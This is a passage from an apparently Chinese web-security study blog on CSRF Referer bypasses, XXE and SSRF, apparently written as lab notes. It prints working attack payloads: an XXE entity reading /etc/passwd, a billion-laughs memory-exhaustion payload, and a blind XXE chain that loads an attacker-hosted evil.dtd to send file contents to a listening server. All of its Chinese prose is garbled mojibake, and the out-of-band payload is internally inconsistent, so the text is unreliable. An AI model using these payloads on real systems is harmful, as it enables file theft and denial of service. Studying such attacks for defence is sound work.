</p><p><code>2.åˆ©ç”¨httpsåè®®</code><br>httpså‘httpè·³è½¬çš„æ—¶å€™Refererä¸ºç©º<br>æ‹¿ä¸€ä¸ªhttpsçš„webshell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;https://xxxxx.xxxxx/attack.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>attack.phpå†™ä¸ŠCSRFæ”»å‡»ä»£ç </p></blockquote><h4 id="2-åˆ¤æ–­Refereræ˜¯æŸåŸŸæƒ…å†µä¸‹ç»•è¿‡"><a href="#2-åˆ¤æ–­Refereræ˜¯æŸåŸŸæƒ…å†µä¸‹ç»•è¿‡" class="headerlink" title="2.åˆ¤æ–­Refereræ˜¯æŸåŸŸæƒ…å†µä¸‹ç»•è¿‡"></a>2.åˆ¤æ–­Refereræ˜¯æŸåŸŸæƒ…å†µä¸‹ç»•è¿‡</h4><blockquote><p>æ¯”å¦‚ä½ æ‰¾çš„csrfæ˜¯<a href="https://link.zhihu.com/?target=http://xxx.com">http://xxx.com</a> </p><p>éªŒè¯çš„refereræ˜¯éªŒè¯çš„*.<a href="https://link.zhihu.com/?target=http://xx.com">http://xx.com</a> </p><p>å¯ä»¥æ‰¾ä¸ªäºŒçº§åŸŸå ä¹‹å&lt;img â€œcsrfåœ°å€â€&gt; ä¹‹ååœ¨æŠŠæ–‡ç« åœ°å€å‘å‡ºå» å°±å¯ä»¥ä¼ªé€ ã€‚</p></blockquote><h4 id="3-åˆ¤æ–­refereræ˜¯å¦å­˜åœ¨æŸå…³é”®å­—"><a href="#3-åˆ¤æ–­refereræ˜¯å¦å­˜åœ¨æŸå…³é”®å­—" class="headerlink" title="3.åˆ¤æ–­refereræ˜¯å¦å­˜åœ¨æŸå…³é”®å­—"></a>3.åˆ¤æ–­refereræ˜¯å¦å­˜åœ¨æŸå…³é”®å­—</h4><blockquote><p>refereråˆ¤æ–­å­˜åœ¨ä¸å­˜åœ¨<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>è¿™ä¸ªå…³é”®è¯</p><p>åœ¨ç½‘ç«™æ–°å»ºä¸€ä¸ª<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>ç›®å½• æŠŠCSRFå­˜æ”¾åœ¨<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>ç›®å½•,å³å¯ç»•è¿‡</p></blockquote><h4 id="4-åˆ¤æ–­Refereræ˜¯å¦å«æœ‰æŸåŸŸå"><a href="#4-åˆ¤æ–­Refereræ˜¯å¦å«æœ‰æŸåŸŸå" class="headerlink" title="4.åˆ¤æ–­Refereræ˜¯å¦å«æœ‰æŸåŸŸå"></a>4.åˆ¤æ–­Refereræ˜¯å¦å«æœ‰æŸåŸŸå</h4><blockquote><p>åˆ¤æ–­äº†Refererå¼€å¤´æ˜¯å¦ä»¥<a href="https://link.zhihu.com/?target=http://126.com">http://126.com</a>ä»¥åŠ126å­åŸŸå ä¸éªŒè¯æ ¹åŸŸåä¸º<a href="https://link.zhihu.com/?target=http://126.com">http://126.com</a> é‚£ä¹ˆæˆ‘è¿™é‡Œå¯ä»¥æ„é€ å­åŸŸå<a href="https://link.zhihu.com/?target=http://x.126.com.xxx.com">http://x.126.com.xxx.com</a>ä½œä¸ºè •è™«ä¼ æ’­çš„è½½ä½“æœåŠ¡å™¨ï¼Œå³å¯ç»•è¿‡ã€‚</p></blockquote><h3 id="3ï¼‰ä¸åŒæµè§ˆå™¨çš„åŒºåˆ«"><a href="#3ï¼‰ä¸åŒæµè§ˆå™¨çš„åŒºåˆ«" class="headerlink" title="3ï¼‰ä¸åŒæµè§ˆå™¨çš„åŒºåˆ«"></a>3ï¼‰ä¸åŒæµè§ˆå™¨çš„åŒºåˆ«</h3><p>â€ƒåœ¨æ»¡è¶³ä¸Šè¿°å‰åç«¯æ¡ä»¶åï¼Œæµè§ˆå™¨åœ¨å®Œæˆé¢„æ£€è¯·æ±‚åä¼šè‡ªåŠ¨æºå¸¦ä¸ŠCookieå­—æ®µï¼Œä½†æ˜¯ç”±äºæµè§ˆå™¨çš„å†…æ ¸ç‰¹æ€§ä¸åŒï¼Œæ­¤æ—¶åˆå‡ºç°äº†ä¸åŒçš„æƒ…å†µ</p><blockquote><p>â€ƒâ€ƒ<code>Firefox</code>æºå¸¦ç½‘ç«™Açš„Cookieå€¼å‘èµ·POSTè¯·æ±‚<br>â€ƒâ€ƒ<code>Edge</code>æ²¡æœ‰æºå¸¦ç½‘ç«™Açš„Cookieå€¼å‘èµ·POSTè¯·æ±‚<br>â€ƒâ€ƒ<code>Chrome</code>æ²¡æœ‰æºå¸¦ç½‘ç«™Açš„Cookieå€¼å‘èµ·POSTè¯·æ±‚</p></blockquote><h2 id="å››ã€xxe"><a href="#å››ã€xxe" class="headerlink" title="å››ã€xxe"></a>å››ã€xxe</h2><blockquote><p><a href="https://www.jianshu.com/p/ec2888780308">æ¨èå­¦ä¹ æ–‡ç« </a></p></blockquote><h3 id="å¿…é¡»åœ¨æ–‡æ¡£ç±»å‹å®šä¹‰-DTD-ä¸­åˆ›å»ºå®ä½“"><a href="#å¿…é¡»åœ¨æ–‡æ¡£ç±»å‹å®šä¹‰-DTD-ä¸­åˆ›å»ºå®ä½“" class="headerlink" title="å¿…é¡»åœ¨æ–‡æ¡£ç±»å‹å®šä¹‰ (DTD) ä¸­åˆ›å»ºå®ä½“"></a>å¿…é¡»åœ¨æ–‡æ¡£ç±»å‹å®šä¹‰ (DTD) ä¸­åˆ›å»ºå®ä½“</h3><p><img src="/2022/05/28/Web-study/image-20221015095141092.png" alt="image-20221015095141092"></p><p>æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œä¸€æ—¦ XML æ–‡æ¡£è¢«è§£æå™¨å¤„ç†ï¼Œå®ƒå°†<code>js</code>ç”¨å®šä¹‰çš„å¸¸é‡<code>â€œJo Smithâ€</code>æ›¿æ¢å®šä¹‰çš„å®ä½“ã€‚å¦‚æ‚¨æ‰€è§ï¼Œè¿™æœ‰å¾ˆå¤šä¼˜ç‚¹ï¼Œå› ä¸ºæ‚¨å¯ä»¥<code>js</code>åœ¨ä¸€ä¸ªåœ°æ–¹æ›´æ”¹ä¸ºä¾‹å¦‚<code>â€œJohn Smithâ€</code>ã€‚</p><p>åœ¨ <code>Java</code> åº”ç”¨ç¨‹åºä¸­ï¼Œ<code>XML</code> å¯ç”¨äºä»å®¢æˆ·ç«¯è·å–æ•°æ®åˆ°æœåŠ¡å™¨ï¼Œæˆ‘ä»¬éƒ½ç†Ÿæ‚‰ <code>JSON api</code>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>xml</code> æ¥è·å–ä¿¡æ¯ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ¡†æ¶ä¼šæ ¹æ® <code>xml</code> ç»“æ„è‡ªåŠ¨å¡«å…… <code>Java</code> å¯¹è±¡ï¼Œä¾‹å¦‚ï¼š</p><p><img src="/2022/05/28/Web-study/image-20221015095555062.png" alt="image-20221015095555062"></p><blockquote><p>PCDATA:<br>å®ƒæ˜¯XMLè§£æå™¨è§£æçš„æ–‡æœ¬æ•°æ®ä½¿ç”¨çš„ä¸€ä¸ªæœ¯è¯­ã€‚XML æ–‡æ¡£ä¸­çš„æ–‡æœ¬é€šå¸¸è§£æä¸ºå­—ç¬¦æ•°æ®ï¼Œæˆ–è€…ï¼ˆæŒ‰ç…§æ–‡æ¡£ç±»å‹å®šä¹‰æœ¯è¯­ï¼‰ç§°ä¸º PCDATAã€‚</p><p>XML çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆ&amp;ã€&lt; å’Œ &gt;ï¼‰åœ¨ PCDATA ä¸­å¯ä»¥è¯†åˆ«ï¼Œå¹¶ç”¨äºè§£æå…ƒç´ åç§°å’Œå®ä½“ã€‚PCDATAï¼ˆå­—ç¬¦æ•°æ®ï¼‰åŒºåŸŸè¢«è§£æå™¨è§†ä¸ºæ•°æ®å—ï¼Œä»è€Œå…è®¸æ‚¨åœ¨æ•°æ®æµä¸­åŒ…å«ä»»æ„å­—ç¬¦ã€‚</p></blockquote><p>å¦‚æœ XML è§£æå™¨é…ç½®ä¸º<strong>å…è®¸å¤–éƒ¨ DTD æˆ–å®ä½“</strong>ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å†…å®¹æ›´æ”¹ä»¥ä¸‹ XML ç‰‡æ®µï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">author</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">js</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;js;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿæˆ‘ä»¬ä»æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å®šä¹‰äº†ä¸€ä¸ªåŒ…å«ï¼Œ<code>XML</code> è§£æå™¨å°†åŠ è½½è¯¥æ–‡ä»¶ï¼Œå¹¶å°†åœ¨å¼•ç”¨å®ä½“çš„ä»»ä½•ä½ç½®æ·»åŠ å†…å®¹ã€‚å‡è®¾ XML æ¶ˆæ¯è¿”å›ç»™ç”¨æˆ·ï¼Œæ¶ˆæ¯å°†æ˜¯ï¼š</p><p><img src="/2022/05/28/Web-study/image-20221015094930498.png" alt="image-20221015094930498"></p><hr><h3 id="XXE-DOSæ”»å‡»"><a href="#XXE-DOSæ”»å‡»" class="headerlink" title="XXE DOSæ”»å‡»"></a>XXE DOSæ”»å‡»</h3><p>åŒXXEæ”»å‡»æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸€ä¸ªDOSæœåŠ¡æ”»å‡»å¯¹æœåŠ¡å™¨ã€‚ ä¸€ä¸ªä¾‹å­çš„æ”»å‡»æ˜¯ï¼š </p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;?xml version=&quot;<span class="number">1.0</span>&quot;?&gt;</span></span><br><span class="line"><span class="params">&lt;!DOCTYPE lolz [</span></span><br><span class="line"><span class="params"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ELEMENT lolz (#PCDATA)&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol1 &quot;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol2 &quot;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol3 &quot;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol4 &quot;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol5 &quot;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol6 &quot;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol7 &quot;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol8 &quot;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol9 &quot;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;&quot;&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="params">&lt;lolz&gt;</span><span class="variable">&amp;lol9</span><span class="punctuation">;</span><span class="params">&lt;/lolz&gt;</span></span><br></pre></td></tr></table></figure><p>å½“<code>XML  parser</code>è½½è¿™ä¸ªæ–‡ä»¶ï¼Œå®ƒè®¤ä¸ºï¼Œå®ƒåŒ…æ‹¬ä¸€ä¸ªæ ¹æœ¬çš„å…ƒç´ ï¼Œâ€<code>lolz</code>â€œï¼ŒåŒ…å«çš„æ–‡æœ¬â€<code>&amp;lol9</code>;â€.  ç„¶è€Œï¼Œâ€<code>&amp;lol9</code>;â€æ˜¯ä¸€ä¸ªå·²å®šä¹‰çš„å®ä½“ï¼Œæ‰©å±•ä¸ºä¸€ä¸ªåŒ…å«åä¸ªâ€&amp;lol8;â€ä¸²ã€‚  æ¯ä¸ªâ€<code>&amp;lol8</code>;â€ä¸²æ˜¯ä¸€ä¸ªå·²å®šä¹‰çš„å®ä½“ï¼Œæ‰©å±•åˆ°åâ€<code>&amp;lol7</code>;â€ä¸²ï¼Œç­‰ç­‰ã€‚  </p><p>åœ¨æ‰€æœ‰çš„å®ä½“æ‰©å¼ ï¼Œå·²ç»è¿›è¡Œå¤„ç†ï¼Œ<strong>è¿™ä¸€å°å‹(&lt;1KB)çš„æ¡†XMLå®é™…ä¸Šä¼šé‡‡å–äº†å‡ ä¹3åƒå…†å­—èŠ‚çš„å­˜å‚¨å™¨ã€‚</strong> </p><h3 id="ç›²æ³¨XXE"><a href="#ç›²æ³¨XXE" class="headerlink" title="ç›²æ³¨XXE"></a>ç›²æ³¨XXE</h3><p>åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥å°† <code>XXE</code> <code>payload</code>å‘é€åˆ° <code>Web</code> åº”ç”¨ç¨‹åºï¼Œä½†<strong>æ°¸è¿œä¸ä¼šè¿”å›å“åº”</strong>ï¼Œè¿™è¢«ç§°ä¸ºå¸¦å¤–æ¼æ´ï¼ˆ<code>Out-of-band</code>ï¼‰</p><p>åˆ©ç”¨æ­¤ç±»æ¼æ´çš„è¿‡ç¨‹éœ€è¦åˆ©ç”¨å‚æ•°å®ä½“ï¼Œä½¿æ”»å‡»è€…è®© <code>XML</code> è§£æå™¨å‘æ”»å‡»è€…</p><p><strong>æ§åˆ¶çš„æœåŠ¡å™¨å‘å‡ºé¢å¤–çš„è¯·æ±‚ï¼Œä»¥ä¾¿è¯»å–æ–‡ä»¶çš„å†…å®¹</strong></p><p>ä½œä¸ºä¸€ä¸ªæ”»å‡»è€…ä½ æœ‰<code>WebWolf</code>åœ¨ä½ çš„æ§åˆ¶( <strong>è¿™å¯ä»¥æ˜¯ä»»ä½•æœåŠ¡å™¨ä½ çš„æ§åˆ¶ä¹‹ä¸‹.</strong> ), ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæœåŠ¡å™¨å¹³ä½¿ç”¨  <code>http://127.0.0.1:9090/home</code></p><p>æˆ‘ä»¬å¦‚ä½•ä½¿ç”¨è¿™äº›ç»ˆç«¯æ£€éªŒæˆ‘ä»¬æ˜¯å¦å¯ä»¥æ‰§è¡Œ<code>XXE</code>? </p><p>æˆ‘ä»¬å¯ä»¥å†æ¬¡ä½¿ç”¨WebWolfä¸¾åŠä¸€ä¸ªæ–‡ä»¶å«  <code>attack.dtd</code> åˆ›å»ºè¿™ä¸€æ–‡ä»¶ä¸ä»¥ä¸‹å†…å®¹ï¼š </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">ping</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;&lt;a href=&quot;http://127.0.0.1:9090/landing&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;a href=&quot;http://127.0.0.1:9090/landing&quot; class=&quot;bare&quot;&gt;http://127.0.0.1:9090/landing&lt;/a&gt;&lt;/a&gt;&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨æäº¤å½¢å¼çš„æ”¹å˜ä½¿ç”¨<code>xml</code>ï¼š </p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;webWolfLink:[webWolfLink]&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%remote;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">text</span>&gt;</span>test<span class="symbol">&amp;ping;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>ç°åœ¨<code>WebWolf</code>æµè§ˆâ€™è¿›å…¥çš„<code>è¯·æ±‚</code>ï¼Œä½ ä¼šçœ‹åˆ°ï¼š </p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;method&quot;</span> : <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">  <span class="string">&quot;path&quot;</span> : <span class="string">&quot;/landing&quot;</span>,</span><br><span class="line">  <span class="string">&quot;headers&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;request&quot;</span> : &#123;</span><br><span class="line">      <span class="string">&quot;user-agent&quot;</span> : <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;parameters&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;test&quot;</span> : [ <span class="string">&quot;HelloWorld&quot;</span> ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;timeTaken&quot;</span> : <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œé€šè¿‡<code>XXE</code>èƒ½å¤Ÿè¿æ¥æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨ï¼Œè¿™æ„å‘³ç€<code>XXE</code>æ³¨å…¥æ˜¯å¯èƒ½çš„ã€‚ å› æ­¤ï¼Œé€šè¿‡<code>XXE</code>æ³¨å…¥æˆ‘ä»¬åŸºæœ¬ä¸Šèƒ½å¤Ÿè¾¾åˆ°ï¼Œ<code>curl</code>å‘½ä»¤çš„ç›¸åŒçš„æ•ˆæœ </p><h4 id="å¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„DTD"><a href="#å¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„DTD" class="headerlink" title="å¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„DTD"></a>å¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„DTD</h4><p>å¦ä¸€ç§æ–¹å¼<code>% å˜é‡</code>(æœ‰ç©ºæ ¼)ï¼Œè¯¥æ–¹å¼åªèƒ½åœ¨DTDä¸­è¿›è¡Œå˜é‡å¼•ç”¨<code>%å˜é‡</code>ï¼Œè€Œä¸èƒ½åœ¨XMLä¸­å¼•ç”¨ã€‚</p><p>æ”¹ä¸ºå¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„DTD(<code>evil.dtd</code>)</p><p>å¦‚æœåœ¨å“åº”åŒ…ä¸­<strong>æ— å›æ˜¾åˆæƒ³è¦è¯»å–æ•æ„Ÿæ–‡ä»¶</strong>æ—¶ï¼Œå¯ä»¥é€šè¿‡<code>OOB</code>å¸¦å¤–æ³¨å…¥çš„æ–¹æ³•<strong>é€šè¿‡å¤–å¸¦æ•°æ®é€šé“æ¥æå–æ•°æ®</strong>ï¼Œæ„é€ <code>payload</code>å¦‚ä¸‹ ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">GVI</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">body</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///tmp/test.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">//æ”»å‡»è€…è¿œç¨‹éƒ¨ç½²evil.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">write</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XXE-ä»‹ç»ä¸ç»•è¿‡"><a href="#XXE-ä»‹ç»ä¸ç»•è¿‡" class="headerlink" title="XXE ä»‹ç»ä¸ç»•è¿‡"></a>XXE ä»‹ç»ä¸ç»•è¿‡</h3><p>ä¸€ä¸ª <code>xml</code> æ–‡æ¡£ä¸ä»…å¯ä»¥ç”¨ <code>UTF-8</code> ç¼–ç ï¼Œä¹Ÿå¯ä»¥ç”¨ <code>UTF-16(ä¸¤ä¸ªå˜ä½“â€Š-â€ŠBE å’Œ LE)ã€UTF-32(å››ä¸ªå˜ä½“â€Š-â€ŠBEã€LEã€2143ã€3412)</code> å’Œ <code>EBCDIC</code> ç¼–ç ã€‚ </p><p>åœ¨è¿™ç§ç¼–ç çš„å¸®åŠ©ä¸‹ï¼Œä½¿ç”¨<code>æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥å¾ˆå®¹æ˜“åœ°ç»•è¿‡ WAF</code>ï¼Œå› ä¸ºåœ¨è¿™ç§ç±»å‹çš„ WAF ä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼<code>é€šå¸¸ä»…é…ç½®ä¸ºå•å­—ç¬¦é›†</code>ã€‚ <code>å¤–æ¥ç¼–ç ä¹Ÿå¯ç”¨äºç»•è¿‡æˆç†Ÿçš„ WAF</code>ï¼Œå› ä¸ºå®ƒä»¬å¹¶ä¸æ€»æ˜¯èƒ½å¤Ÿå¤„ç†ä¸Šé¢åˆ—å‡ºçš„æ‰€æœ‰ç¼–ç ã€‚</p><p>ä¾‹å¦‚ï¼Œ<code>libxml2</code> è§£æå™¨åªæ”¯æŒä¸€ç§ç±»å‹çš„ <code>utf-32â€Š-â€Šutf-32BE</code>ï¼Œç‰¹åˆ«æ˜¯ä¸æ”¯æŒ <code>BOM</code>ã€‚</p><hr><h2 id="äº”ã€ssrf"><a href="#äº”ã€ssrf" class="headerlink" title="äº”ã€ssrf"></a>äº”ã€ssrf</h2><h3 id="ä¸å½“å‡½æ•°åˆ©ç”¨"><a href="#ä¸å½“å‡½æ•°åˆ©ç”¨" class="headerlink" title="ä¸å½“å‡½æ•°åˆ©ç”¨"></a>ä¸å½“å‡½æ•°åˆ©ç”¨</h3><blockquote><p>PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:<br>&#96;&#96;file_get_contents()<code> </code>fsockopen()<code> </code>curl_exec()&#96;   </p></blockquote><h5 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content"></a>file_get_content</h5><blockquote><p><code>file_get_content()</code>å‡½æ•°æ˜¯ç”¨äºå°†æ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ï¼Œé€»è¾‘å’Œå‰é¢ä¸€æ ·ã€‚å®ƒæ”¯æŒè¯»å–è¿œç¨‹æ–‡ä»¶æˆ–è€…æœ¬åœ°æ–‡ä»¶ï¼Œä¹Ÿæ”¯æŒå¤šç§åè®®ã€‚æ›´å¤šçš„ï¼Œå®ƒè¿˜æ”¯æŒphpä¼ªåè®®ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¼ªåè®®æ–¹æ³•è¯»å–æœ¬åœ°æºç </p></blockquote><h5 id="curl-exec"><a href="#curl-exec" class="headerlink" 